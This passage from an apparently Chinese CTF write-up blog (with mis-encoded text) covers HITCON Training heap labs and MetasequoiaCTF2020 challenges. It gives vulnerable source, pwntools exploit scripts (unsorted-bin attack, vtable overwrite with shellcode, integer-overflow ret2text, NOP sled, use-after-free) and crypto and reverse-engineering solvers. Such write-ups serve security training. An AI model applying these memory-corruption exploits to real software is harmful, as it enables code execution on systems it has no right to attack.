heap:\"); read_input(heaparray[i],size); puts(\"SuccessFul\"); break ; } } } void edit_heap(){ int idx ; char buf[4]; size_t size ; printf(\"Index :\"); read(0,buf,4); idx = atoi(buf); if(idx \u003c 0 || idx\u003e= 10){ puts(\"Out of bound!\"); _exit(0); } if(heaparray[idx]){ printf(\"Size of Heap :\"); read(0,buf,8); size = atoi(buf); printf(\"Content of heap :\"); read_input(heaparray[idx] ,size); puts(\"Done !\"); }else{ puts(\"No such heap !\"); } } void delete_heap(){ int idx ; char buf[4]; printf(\"Index :\"); read(0,buf,4); idx = atoi(buf); if(idx \u003c 0 || idx\u003e= 10){ puts(\"Out of bound!\"); _exit(0); } if(heaparray[idx]){ free(heaparray[idx]); heaparray[idx] = NULL ; puts(\"Done !\"); }else{ puts(\"No such heap !\"); } } void l33t(){ system(\"cat /home/magicheap/flag\"); } int main(){ char buf[8]; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); while(1){ menu(); read(0,buf,8); switch(atoi(buf)){ case 1 : create_heap(); break ; case 2 : edit_heap(); break ; case 3 : delete_heap(); break ; case 4 : exit(0); break ; case 4869 : if(magic\u003e 4869){ puts(\"Congrt !\"); l33t(); }else puts(\"So sad !\"); break ; default : puts(\"Invalid Choice\"); break; } } return 0 ; } åœ¨ edit æ—¶æ²¡æœ‰æ£€æŸ¥ sizeï¼Œå¯ä»¥å †æº¢å‡ºã€‚é¢˜ç›®è¦æ±‚ bss æ®µçš„ magic å¤§äº 0x1305ï¼Œä¸”è¾“å…¥æ•°å­—ç­‰äº 0x1305ï¼Œå³å¯ getshellã€‚é‚£ä¹ˆæˆ‘ä»¬é‡Šæ”¾ä¸€ä¸ª chunk åˆ° unsorted binï¼Œåˆ©ç”¨å †æº¢å‡ºä¿®æ”¹å…¶ bk ä¸º magic-0x10ï¼Œå†ç”³è¯·å›æ¥ï¼Œé‚£ä¹ˆ magic å°±ä¼šè¢«è®¤ä¸ºæ˜¯ä¸‹ä¸€ä¸ª unsorted chunk çš„ fdï¼Œè¢«å¡«å…¥ main_arena+88ï¼Œè¿™ä¸ªå€¼è¿œè¶… 0x1305ã€‚ add(0x10) # 0 add(0x80) # 1 add(0x10) # 2 delete(1) magic = 0x6020a0 fd = 0 bk = magic-0x10 payload = flat('a'*0x10,0,0x91,fd,bk) edit(0,len(payload),payload) add(0x80) sla(':',str(0x1305)) ","date":"2020-02-16","objectID":"/hitcon-training/:14:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"HITCON Training ç»ƒä¹ è®°å½•","uri":"/hitcon-training/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"lab15 - zoo æºç ï¼š #include \u003cstdio.h\u003e#include \u003ciostream\u003e#include \u003cunistd.h\u003e#include \u003cvector\u003e#include \u003cstring.h\u003eusing namespace std; char nameofzoo[100]; class Animal { public : Animal(){ memset(name,0,24); weight = 0; } virtual void speak(){;} virtual void info(){;} protected : char name[24]; int weight; }; class Dog : public Animal{ public : Dog(string str,int w){ strcpy(name,str.c_str()); weight = w ; } virtual void speak(){ cout \u003c\u003c\"Wow ~ Wow ~ Wow ~\" \u003c\u003c endl ; } virtual void info(){ cout \u003c\u003c\"|---------------------|\" \u003c\u003c endl ; cout \u003c\u003c\"| Animal info |\" \u003c\u003c endl; cout \u003c\u003c\"|---------------------|\" \u003c\u003c endl; cout \u003c\u003c\" Weight :\"\u003c\u003c this-\u003eweight \u003c\u003c endl ; cout \u003c\u003c\" Name : \"\u003c\u003c this-\u003ename \u003c\u003c endl ; cout \u003c\u003c\"|---------------------|\" \u003c\u003c endl; } }; class Cat : public Animal{ public : Cat(string str,int w){ strcpy(name,str.c_str()); weight = w ; } virtual void speak(){ cout \u003c\u003c\"Meow ~ Meow ~ Meow ~\" \u003c\u003c endl ; } virtual void info(){ cout \u003c\u003c\"|---------------------|\" \u003c\u003c endl ; cout \u003c\u003c\"| Animal info |\" \u003c\u003c endl; cout \u003c\u003c\"|---------------------|\" \u003c\u003c endl; cout \u003c\u003c\" Weight :\"\u003c\u003c this-\u003eweight \u003c\u003c endl ; cout \u003c\u003c\" Name : \"\u003c\u003c this-\u003ename \u003c\u003c endl ; cout \u003c\u003c\"|---------------------|\" \u003c\u003c endl; } }; vector\u003cAnimal *\u003e animallist ; void menu(){ cout \u003c\u003c\"*********************************\" \u003c\u003c endl ; cout \u003c\u003c\" 1. Add a dog \" \u003c\u003c endl ; cout \u003c\u003c\" 2. Add a cat \" \u003c\u003c endl ; cout \u003c\u003c\" 3. Listen a animal \" \u003c\u003c endl ; cout \u003c\u003c\" 4. Show a animal info \" \u003c\u003c endl ; cout \u003c\u003c\" 5. Remove a animal \" \u003c\u003c endl ; cout \u003c\u003c\" 6. Exit \" \u003c\u003c endl ; cout \u003c\u003c\"*********************************\" \u003c\u003c endl ; } void adddog(){ string name ; int weight ; cout \u003c\u003c\"Name : \" ; cin \u003e\u003e name; cout \u003c\u003c\"Weight : \" ; cin \u003e\u003e weight ; Dog *mydog = new Dog(name,weight); animallist.push_back(mydog); } void addcat(){ string name ; int weight ; cout \u003c\u003c\"Name : \" ; cin \u003e\u003e name; cout \u003c\u003c\"Weight : \" ; cin \u003e\u003e weight ; Cat *mycat = new Cat(name,weight); animallist.push_back(mycat); } void remove(){ unsigned int idx ; if(animallist.size() == 0){ cout \u003c\u003c\"no any animal!\" \u003c\u003c endl ; return ; } cout \u003c\u003c\"index of animal : \"; cin \u003e\u003e idx ; if(idx\u003e= animallist.size()){ cout \u003c\u003c\"out of bound !\" \u003c\u003c endl; return ; } delete animallist[idx]; animallist.erase(animallist.begin()+idx); } void showinfo(){ unsigned int idx ; if(animallist.size() == 0){ cout \u003c\u003c\"no any animal!\" \u003c\u003c endl ; return ; } cout \u003c\u003c\"index of animal : \"; cin \u003e\u003e idx ; if(idx\u003e= animallist.size()){ cout \u003c\u003c\"out of bound !\" \u003c\u003c endl; return ; } animallist[idx]-\u003einfo(); } void listen(){ unsigned int idx ; if(animallist.size() == 0){ cout \u003c\u003c\"no any animal!\" \u003c\u003c endl ; return ; } cout \u003c\u003c\"index of animal : \"; cin \u003e\u003e idx ; if(idx\u003e= animallist.size()){ cout \u003c\u003c\"out of bound !\" \u003c\u003c endl; return ; } animallist[idx]-\u003espeak(); } int main(void){ unsigned int choice ; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); cout \u003c\u003c\"Name of Your zoo :\" ; read(0,nameofzoo,100); while(1){ menu(); cout \u003c\u003c\"Your choice :\"; cin \u003e\u003e choice ; cout \u003c\u003c endl ; switch(choice){ case 1 : adddog(); break ; case 2 : addcat(); break ; case 3 : listen(); break ; case 4 : showinfo(); break ; case 5 : remove(); break ; case 6 : _exit(0); default : cout \u003c\u003c\"Invaild choice\" \u003c\u003c endl; break ; } } return 0 ; } åœ¨ Dog å’Œ Cat çš„æ„é€ å‡½æ•°ä¸­å­˜åœ¨æœªæ£€æŸ¥é•¿åº¦çš„ strcpyï¼Œå› æ­¤å¯ä»¥å †æº¢å‡ºã€‚åŒæ—¶ï¼Œæœ¬é¢˜å…³é—­äº† NXï¼Œè€Œ Dog ä¸­å­˜åœ¨è™šè¡¨æŒ‡é’ˆï¼Œå› æ­¤å¯ä»¥å°†å…¶è¦†ç›–ä¸º shellcode åœ°å€çš„åœ°å€ã€‚é‚£ä¹ˆ shellcode å’Œ shellcode åœ°å€åˆ†åˆ«åœ¨å“ªå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥åœ¨ç¨‹åºç¬¬ä¸€æ¬¡è¾“å…¥æ—¶å¸ƒç½® shellcodeï¼Œåœ¨åé¢è·Ÿä¸Š shellcode æ‰€åœ¨åœ°å€ã€‚ name = 0x605420 shellcode = asm(shellcraft.sh()) sla('zoo',shellcode+p64(name)) add() add() free(0) add('a'*72+p64(name+len(shellcode))) sla('choice :',3) sla(':',0) ","date":"2020-02-16","objectID":"/hitcon-training/:15:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"HITCON Training ç»ƒä¹ è®°å½•","uri":"/hitcon-training/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"ç¬¬ä¸€æ¬¡å‡ºé¢˜ï¼Œç»éªŒä¸è¶³ï¼Œæ„Ÿè°¢å‚èµ›é€‰æ‰‹æµ·æ¶µã€‚ è¿™æ¬¡ç»™é˜Ÿå†…æ–°äººèµ›å‡ºé¢˜ï¼Œé¢˜ç›®è®¾ç½®å¾—æ¯”è¾ƒç®€å•ï¼Œå…±æœ‰ï¼š Web * 5 Pwn * 5 Misc * 4 Crypto * 3 Reverse * 3 æˆ‘è´Ÿè´£å‡º Pwn å’Œ Reverseã€Crypto çš„ç­¾åˆ°é¢˜ã€ä»¥åŠä¸¤é¢˜ Webã€‚è¿™é‡Œå°±å†™ä¸‹æˆ‘è´Ÿè´£å‡ºçš„é¢˜çš„ wpã€‚ ","date":"2020-02-15","objectID":"/metasequoiactf2020/:0:0","tags":["RSA","å¤å…¸å¯†ç ä¸ç¼–ç ","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´","JWT"],"title":"ç‰›åˆ€å°è¯•ï¼šMetasequoiaCTF2020 éƒ¨åˆ†é¢˜è§£","uri":"/metasequoiactf2020/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"Crypto ","date":"2020-02-15","objectID":"/metasequoiactf2020/:1:0","tags":["RSA","å¤å…¸å¯†ç ä¸ç¼–ç ","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´","JWT"],"title":"ç‰›åˆ€å°è¯•ï¼šMetasequoiaCTF2020 éƒ¨åˆ†é¢˜è§£","uri":"/metasequoiactf2020/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"Ridicule é¦–å…ˆæ˜¯æ²¡æœ‰ç»•ä»»ä½•å¼¯çš„ RSA å…±æ¨¡æ”»å‡»ã€‚é¢˜ç›®æè¿°è¯´åŒä¸€æ¡æ¶ˆæ¯å‘é€äº†ä¸¤æ¬¡ï¼Œå¯ä»¥å¾ˆå®¹æ˜“æƒ³åˆ°è¿™ä¸ªæ–¹æ³•ã€‚åŸç†è¯¦è§ CTF Wikiã€‚ è¿™é‡Œç»™å‡ºåŠ å¯†å’Œè§£å¯†çš„è„šæœ¬ï¼š from Crypto.Util import number from gmpy2 import * # enc n_length = 2048 p = number.getPrime(n_length) q = number.getPrime(n_length) n = p*q print(n) phi = (p-1)*(q-1) e1 = 65537 e2 = 395327 d1 = invert(e1,phi) d2 = invert(e2,phi) #flag = b'flag{rS4_c0mOon_MOdu1u5_a7k}' flag = b'7=28LC$c04_\u003e~@?0|~5F`Fd02f\u003cN' flag = number.bytes_to_long(flag) c1 = powmod(flag,e1,n) c2 = powmod(flag,e2,n) print(c1) print(c2) # dec def exgcd(a,b): if b==0: return 1, 0, a x2, y2, r = exgcd(b, a%b) x1 = y2 y1 = x2-(a//b)*y2 return x1, y1, r s1,s2,t = exgcd(e1,e2) m = powmod(c1,s1,n) * powmod(c2,s2,n) % n print(number.long_to_bytes(m)) åœ¨è§£å¯†åå¾—åˆ°äº†ï¼š 7=28LC$c04_\u003e~@?0|~5F`Fd02f\u003cN è§‚å¯Ÿå¯†æ–‡çš„å­—ç¬¦é›†ï¼Œä¸éš¾å‘ç°æ˜¯ ROT47 åŠ å¯†ï¼Œå† ROT47 ä¸€æ¬¡å³è§£å¯†å¾—åˆ°äº† flagã€‚ ","date":"2020-02-15","objectID":"/metasequoiactf2020/:1:1","tags":["RSA","å¤å…¸å¯†ç ä¸ç¼–ç ","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´","JWT"],"title":"ç‰›åˆ€å°è¯•ï¼šMetasequoiaCTF2020 éƒ¨åˆ†é¢˜è§£","uri":"/metasequoiactf2020/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"Reverse æˆ‘å¹¶ä¸æ˜¯å¾ˆä¼šå‡ºé€†å‘ï¼Œä½†æ˜¯é˜Ÿä¼é‡Œæœ‰åŒå­¦éœ€è¦åšï¼Œäºæ˜¯è¿™äº›é¢˜ç›®åŸºæœ¬éƒ½æ˜¯æœ‰åŸé¢˜çš„ã€‚ ","date":"2020-02-15","objectID":"/metasequoiactf2020/:2:0","tags":["RSA","å¤å…¸å¯†ç ä¸ç¼–ç ","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´","JWT"],"title":"ç‰›åˆ€å°è¯•ï¼šMetasequoiaCTF2020 éƒ¨åˆ†é¢˜è§£","uri":"/metasequoiactf2020/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"CMCS Reverse ç±»ç­¾åˆ°é¢˜ï¼Œè™½ç„¶å¯ä»¥é™æ€åˆ†æå‡ºç­”æ¡ˆï¼Œè¿˜æ˜¯æ¨èåŠ¨æ€è°ƒè¯•ã€‚é€†å‘å¯ä»¥å‘ç°å…³é”®å‡½æ•° sub_8048708 å’Œ sub_8048658ï¼Œåˆ†æå‰è€…å¯çŸ¥ eax å­˜å‚¨ sub_8048658 è¿”å›çš„ flag å€¼ï¼Œå› æ­¤åœ¨åè€…ä¸‹æ–­ç‚¹è°ƒè¯•ï¼Œæ‰“å° eax å€¼å³å¾—åˆ° flagã€‚ b *0x8048658 r fin x/16sw $eax ","date":"2020-02-15","objectID":"/metasequoiactf2020/:2:1","tags":["RSA","å¤å…¸å¯†ç ä¸ç¼–ç ","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´","JWT"],"title":"ç‰›åˆ€å°è¯•ï¼šMetasequoiaCTF2020 éƒ¨åˆ†é¢˜è§£","uri":"/metasequoiactf2020/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"Babysmali é¢˜ç›®ç»™äº† smali.jar ä»¥åŠ src.smaliï¼Œæˆ‘ä»¬å…ˆå°†åè€…æ±‡ç¼–æˆ dex æ–‡ä»¶ã€‚ $ java -jar smali.jar assemble src.smali -o src.dex ç„¶åä½¿ç”¨ jadx åç¼–è¯‘ dex æ–‡ä»¶ï¼š package com.example.hellosmali.hellosmali; public class Digest { public static boolean check(String input) { String str = \"+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"; if (input == null || input.length() == 0) { return false; } int i; char[] charinput = input.toCharArray(); StringBuilder v2 = new StringBuilder(); for (char toBinaryString : charinput) { String intinput = Integer.toBinaryString(toBinaryString); while (intinput.length() \u003c8) { intinput = \"0\" + intinput; } v2.append(intinput); } while (v2.length() % 6 != 0) { v2.append(\"0\"); } String v1 = String.valueOf(v2); char[] v4 = new char[(v1.length() / 6)]; for (i = 0; i \u003c v4.length; i++) { int v6 = Integer.parseInt(v1.substring(0, 6), 2); v1 = v1.substring(6); v4[i] = str.charAt(v6); } StringBuilder v3 = new StringBuilder(String.valueOf(v4)); if (input.length() % 3 == 1) { v3.append(\"!?\"); } else if (input.length() % 3 == 2) { v3.append(\"!\"); } if (String.valueOf(v3).equals(\"xsZDluYYreJDyrpDpucZCo!?\")) { return true; } return false; } } ä»å­—ç¬¦é›†å¯ä»¥çœ‹å‡ºå’Œ Base64 ç¼–ç æœ‰å…³ï¼Œå®é™…ä¸Šåªæ˜¯å®ƒçš„ä¸€ä¸ªå˜ç§ã€‚æ—¢å¯ä»¥ç”¨ python è§£ï¼Œä¹Ÿå¯ä»¥ç”¨ java è§£ï¼Œpython ç‰ˆï¼š import string base64_charset = '+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' def decode(base64_str): \"\"\" è§£ç  base64 å­—ç¬¦ä¸² :param base64_str:base64 å­—ç¬¦ä¸² :return: è§£ç åçš„ bytearrayï¼›è‹¥å…¥å‚ä¸æ˜¯åˆæ³• base64 å­—ç¬¦ä¸²ï¼Œè¿”å›ç©º bytearray \"\"\" # å¯¹æ¯ä¸€ä¸ª base64 å­—ç¬¦å–ä¸‹æ ‡ç´¢å¼•ï¼Œå¹¶è½¬æ¢ä¸º 6 ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸² base64_bytes = ['{:0\u003e6}'.format(str(bin(base64_charset.index(s))).replace('0b', '')) for s in base64_str if s != '='] resp = bytearray() nums = len(base64_bytes) // 4 remain = len(base64_bytes) % 4 integral_part = base64_bytes[0:4 * nums] while integral_part: # å– 4 ä¸ª 6 ä½ base64 å­—ç¬¦ï¼Œä½œä¸º 3 ä¸ªå­—èŠ‚ tmp_unit = ''.join(integral_part[0:4]) tmp_unit = [int(tmp_unit[x: x + 8], 2) for x in [0, 8, 16]] for i in tmp_unit: resp.append(i) integral_part = integral_part[4:] if remain: remain_part = ''.join(base64_bytes[nums * 4:]) tmp_unit = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)] for i in tmp_unit: resp.append(i) return resp if __name__==\"__main__\": print decode('A0NDlKJLv0hTA1lDAuZRgo==') java ç‰ˆï¼š public class XMan { public static void main(String[] args) { String v6 = \"+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"; String s = \"xsZDluYYreJDyrpDpucZCo\"; StringBuilder sb = new StringBuilder(); for (int i = 0; i \u003c s.length(); i++) { int tmp = v6.indexOf(s.charAt(i)); String ss = Integer.toBinaryString(tmp); if (ss.length() == 5) { ss = \"0\" + ss; } else if (ss.length() == 4) { ss = \"00\" + ss; } else if (ss.length() == 3) { ss = \"000\" + ss; } else if (ss.length() == 2) { ss = \"0000\" + ss; } else if (ss.length() == 1) { ss = \"00000\" + ss; } else if (ss.length() == 0) { ss = \"000000\" + ss; } sb.append(ss); } String x = sb.toString() +\"0000\"; StringBuilder stringBuilder = new StringBuilder(); for (int i = 0; i \u003c x.length(); i += 8) { String tmp = x.substring(i, i + 8); byte b = (byte) Integer.parseInt(tmp, 2); stringBuilder.append((char) b); } System.out.println(stringBuilder.toString()); } } ","date":"2020-02-15","objectID":"/metasequoiactf2020/:2:2","tags":["RSA","å¤å…¸å¯†ç ä¸ç¼–ç ","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´","JWT"],"title":"ç‰›åˆ€å°è¯•ï¼šMetasequoiaCTF2020 éƒ¨åˆ†é¢˜è§£","uri":"/metasequoiactf2020/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"Prison è¿™æ˜¯ä¸€é“çº¯è¿·å®«é¢˜ï¼Œåªæ˜¯å·¥ä½œé‡æœ‰ç‚¹å¤§ã€‚å‚è€ƒ WPã€‚ ","date":"2020-02-15","objectID":"/metasequoiactf2020/:2:3","tags":["RSA","å¤å…¸å¯†ç ä¸ç¼–ç ","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´","JWT"],"title":"ç‰›åˆ€å°è¯•ï¼šMetasequoiaCTF2020 éƒ¨åˆ†é¢˜è§£","uri":"/metasequoiactf2020/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"Pwn æ‰€æœ‰é¢˜ç›®å‡ä¸º 64 ä½ç¨‹åºï¼Œlibc ç‰ˆæœ¬ 2.23ã€‚ ","date":"2020-02-15","objectID":"/metasequoiactf2020/:3:0","tags":["RSA","å¤å…¸å¯†ç ä¸ç¼–ç ","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´","JWT"],"title":"ç‰›åˆ€å°è¯•ï¼šMetasequoiaCTF2020 éƒ¨åˆ†é¢˜è§£","uri":"/metasequoiactf2020/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"Blacksmith Pwn ç±»ç­¾åˆ°é¢˜ã€‚æœ¬é¢˜çš„è¾“å‡ºè®©è¿™é¢˜çœ‹ä¸Šå»åƒå †é¢˜ï¼Œä½†å®é™…ä¸Šåªæœ‰ç¬¬ä¸€ä¸ªé”»é€ å‰‘çš„åŠŸèƒ½æ˜¯æœ‰å®é™…ä½œç”¨çš„ã€‚å¯ä»¥çœ‹åˆ°åœ¨ç»™å‰‘å‘½åæ—¶ï¼Œé¦–å…ˆè¦è¾“å…¥åå­—é•¿åº¦ï¼Œå¦‚æœé•¿åº¦è¶…è¿‡ 0x40 åˆ™å¤±è´¥ã€‚ä½†æ˜¯æ³¨æ„åˆ°åå­—é•¿åº¦è¿™ä¸ªå˜é‡æ˜¯æ— ç¬¦å·çš„ï¼Œå› æ­¤å¯ä»¥æ•´æ•°æº¢å‡ºï¼šè¾“å…¥ -1ï¼Œåˆ™å¯è¾“å…¥ 0xffffffffffffffff å­—ç¬¦ï¼Œç»•è¿‡äº†è¿™ä¸ªåˆ¤æ–­ã€‚ éšåå°±å¯ä»¥æ ˆæº¢å‡ºäº†ï¼Œç¨‹åºä¸­å­˜åœ¨åé—¨å‡½æ•°ï¼Œç›´æ¥ ret2textã€‚ sla('\u003e ','1') sla('name?\\n','-1') payload = flat('a'*0x48,0x4007d6) sla('is?\\n',payload) ","date":"2020-02-15","objectID":"/metasequoiactf2020/:3:1","tags":["RSA","å¤å…¸å¯†ç ä¸ç¼–ç ","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´","JWT"],"title":"ç‰›åˆ€å°è¯•ï¼šMetasequoiaCTF2020 éƒ¨åˆ†é¢˜è§£","uri":"/metasequoiactf2020/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"Snow Mountain è¿™é¢˜å…³é—­äº† NX ä¿æŠ¤ï¼Œè¯´æ˜éœ€è¦å¸ƒç½® shellcodeï¼Œéš¾ç‚¹åœ¨äºæ‰¾åˆ° shellcode ä½ç½®ã€‚ç¨‹åºé¦–å…ˆç»™å‡ºä¸€ä¸ªæ ˆä¸Šçš„éšæœºåœ°å€ï¼Œå¹¶ä¸”æ ˆä¸Šå­˜åœ¨ä¸€ä¸ª 0x1000 çš„å­—ç¬¦æ•°ç»„ã€‚æ ¹æ®é¢˜ç›®æç¤º â€œæ»‘é›ªâ€ã€â€œé›ªæ©‡â€ ç­‰ï¼Œå®¹æ˜“æƒ³åˆ°åˆ©ç”¨ nop sled æ»‘åˆ° shellcode çš„ä½ç½®æ¥å¢åŠ å®¹é”™ç‡ã€‚æƒ³åˆ° nop sled çš„è¯è¿™é¢˜å°±åšå®Œäº†ã€‚ ru('position: 0x') cur = int(ru('\\n'),16) leak('cur',cur) payload = asm(shellcraft.sh()) payload = payload.rjust(0x1000-1,'\\x90') sla('\u003e ',payload) sla('\u003e ',hex(cur)) ","date":"2020-02-15","objectID":"/metasequoiactf2020/:3:2","tags":["RSA","å¤å…¸å¯†ç ä¸ç¼–ç ","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´","JWT"],"title":"ç‰›åˆ€å°è¯•ï¼šMetasequoiaCTF2020 éƒ¨åˆ†é¢˜è§£","uri":"/metasequoiactf2020/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"Summoner æœ¬æ¬¡æ¯”èµ›å”¯äºŒçš„å †é¢˜ï¼Œä½†æ˜¯æå…¶ç®€å•ã€‚é‚ªæ¶å¬å”¤å¸ˆå¬å”¤äº†ä¸€åª 5 çº§ç”Ÿç‰©ï¼Œä½†æ˜¯ä½ åªèƒ½å¬å”¤å››çº§ç”Ÿç‰©ï¼Œä½ çš„ç›®çš„å°±æ˜¯ä¿®æ”¹ç”Ÿç‰©çš„ç­‰çº§ä¸º 5 çº§ã€‚ é¢˜ç›®æä¾›äº†å‡ ç§å‘½ä»¤ï¼š å±•ç¤ºå¬å”¤ç‰©ä¿¡æ¯ å¬å”¤ä¸€åªç”Ÿç‰©ï¼Œå¹¶ç»™å®ƒèµ·åå­— è®¾ç½®ç”Ÿç‰©çš„ç­‰çº§ï¼Œä½†å¿…é¡»å°äº 5 æ”»å‡»æ•Œæ–¹å¬å”¤ç‰© é‡Šæ”¾å¬å”¤ç‰© æˆ‘ä»¬é€šè¿‡é€†å‘å¯ä»¥å¾—çŸ¥ï¼Œå¬å”¤ç‰©çš„ç»“æ„ä½“é•¿è¿™æ ·ï¼š struct creature { char *name; int level; }; éšåå¯ä»¥å‘ç°ä¸¤å¤„æ¼æ´ï¼š å¬å”¤æ—¶ï¼Œè¾“å…¥çš„ name ä½¿ç”¨ strdup å‡½æ•°ï¼ˆéšå¼è°ƒç”¨äº† mallocï¼‰ï¼Œä½†å¹¶æ²¡æœ‰æ£€æŸ¥é•¿åº¦ï¼Œå› æ­¤å¯ä»¥æº¢å‡ºåˆ°ä¸‹ä¸€ä¸ª 8 å­—èŠ‚å¤„ã€‚ åœ¨é‡Šæ”¾å¬å”¤ç‰©æ—¶ï¼Œåªä¼šè°ƒç”¨ free(c-\u003ename)ï¼Œç„¶åå°†ç»“æ„ä½“æŒ‡é’ˆç½®ç©ºï¼Œä½†å¹¶ä¸ä¼šé‡Šæ”¾ç»“æ„ä½“æŒ‡é’ˆæœ¬èº«ã€‚ å› æ­¤æˆ‘ä»¬å°è¯•å…ˆå¬å”¤ä¸€ä¸ªåä¸º aaaaaaaa\\x05 çš„ç”Ÿç‰©ï¼Œæ­¤æ—¶å †ç»“æ„å¦‚ä¸‹ï¼š pwndbg\u003e heapls ADDR SIZE STATUS sbrk_base 0x56476bb24000 chunk 0x56476bb24000 0x1010 (inuse) chunk 0x56476bb25010 0x20 (inuse) chunk 0x56476bb25030 0x20 (inuse) chunk 0x56476bb25050 0x20fb0 (top) sbrk_end 0x56476bb46000 pwndbg\u003e x/8gx 0x56476bb25010 0x56476bb25010: 0x0000000000000000 0x0000000000000021 0x56476bb25020: 0x000056476bb25040 0x0000000000000000 0x56476bb25030: 0x0000000000000000 0x0000000000000021 0x56476bb25040: 0x6161616161616161 0x0000000000000005 å¯ä»¥çœ‹åˆ°æœ‰ 2 å— 0x20 çš„ chunkï¼Œç¬¬ä¸€å—æ˜¯ç»“æ„ä½“æŒ‡é’ˆï¼Œå­˜æ”¾ç€ name åœ°å€å’Œ level æ•°å€¼ï¼›ç¬¬äºŒå—å°±æ˜¯ name äº†ï¼Œå­˜æ”¾ç€æˆ‘ä»¬è¾“å…¥çš„ nameï¼Œæ³¨æ„è¿™æ—¶ç¬¬äºŒä¸ª 8 å­—èŠ‚å·²ç»æ˜¯ 5 äº†ã€‚éšåæˆ‘ä»¬é‡Šæ”¾å¬å”¤ç‰©ï¼š pwndbg\u003e x/8gx 0x5621c569e010 0x5621c569e010: 0x0000000000000000 0x0000000000000021 0x5621c569e020: 0x00005621c569e040 0x0000000000000000 0x5621c569e030: 0x0000000000000000 0x0000000000000021 0x5621c569e040: 0x0000000000000000 0x0000000000000005 è¿™æ—¶ name è¢« free äº†ä½†æŒ‡é’ˆè¿˜åœ¨ï¼Œæˆ‘ä»¬åˆšåˆšå†™çš„ \\x05 ä¹Ÿè¿˜åœ¨ã€‚è¿™æ—¶å†å¬å”¤å°±èƒ½å¾—åˆ° 0x5621c569e030 å¤„çš„ä¸€å— chunk ä½œä¸ºç»“æ„ä½“æŒ‡é’ˆï¼Œè€Œæ–°çš„ name è·‘åˆ°äº† 0x55feced35050ï¼š pwndbg\u003e x/12gx 0x55feced35010 0x55feced35010: 0x0000000000000000 0x0000000000000021 0x55feced35020: 0x000055feced35040 0x0000000000000000 0x55feced35030: 0x0000000000000000 0x0000000000000021 0x55feced35040: 0x000055feced35060 0x0000000000000005 0x55feced35050: 0x0000000000000000 0x0000000000000021 0x55feced35060: 0x0000000000000061 0x0000000000000000 äºæ˜¯æ­¤æ—¶ï¼Œç»“æ„ä½“æŒ‡é’ˆé‡Œçš„ level å°±å˜æˆäº† 5ã€‚ sla('\u003e ','summon aaaaaaaa'+'\\x05') sla('\u003e ','release') sla('\u003e ','summon a') sla('\u003e ','strike') ","date":"2020-02-15","objectID":"/metasequoiactf2020/:3:3","tags":["RSA","å¤å…¸å¯†ç ä¸ç¼–ç ","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´","JWT"],"title":"ç‰›åˆ€å°è¯•ï¼šMetasequoiaCTF2020 éƒ¨åˆ†é¢˜è§£","uri":"/metasequoiactf2020/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"Demon Dragon é¢˜ç›®æœ¬èº«ä¸éš¾ï¼Œç•¥å¾®æœ‰äº›å·¥ä½œé‡ã€‚ é¦–å…ˆæ˜¯é€†å‘ç¨‹åºï¼Œä¸€å¼€å§‹ä¼šè°ƒç”¨ 6 ä¸ªå‡½æ•°ï¼Œè¿™ 6 ä¸ªå‡½æ•°æ¥è‡ªé¢˜ç›®åŒæ—¶ç»™å‡ºçš„ libmagic.soï¼Œç›®çš„æ˜¯ä¸ºäº†è®©è¿™ 6 ä¸ªå‡½æ•°è¢«åŠ¨æ€é“¾æ¥è¿›æ¥ï¼Œå¯ä»¥ç›´æ¥å¿½ç•¥ã€‚éšåï¼ŒDemon Dragon ä¼šä½¿ç”¨ 5 ç§å…ƒç´ æ”»å‡»ä½ ï¼Œå…ƒç´ çš„é¡ºåºæ˜¯éšæœºçš„ã€‚æ¥ä¸‹æ¥éœ€è¦è¾“å…¥ä½¿ç”¨çš„æŠ€èƒ½ï¼Œè¿™é‡Œå­˜åœ¨ç®€å•çš„ gets æ ˆæº¢å‡ºã€‚ä½†æ˜¯å¹¶ä¸æ¸…æ¥šæº¢å‡ºä¹‹åè¦å¹²ä»€ä¹ˆã€‚ ç„¶åæˆ‘ä»¬é€†å‘ libmagic.soï¼Œè¿™ä¸ªæ–‡ä»¶ä¿ç•™äº†ç¬¦å·è¡¨ï¼Œå› æ­¤å¯ä»¥çœ‹åˆ°åˆšæ‰çš„ 6 ä¸ªå‡½æ•°ï¼Œåˆ†åˆ«æ˜¯ 5 ç§å…ƒç´ æŠ¤ç›¾å’Œä¸€ä¸ª check 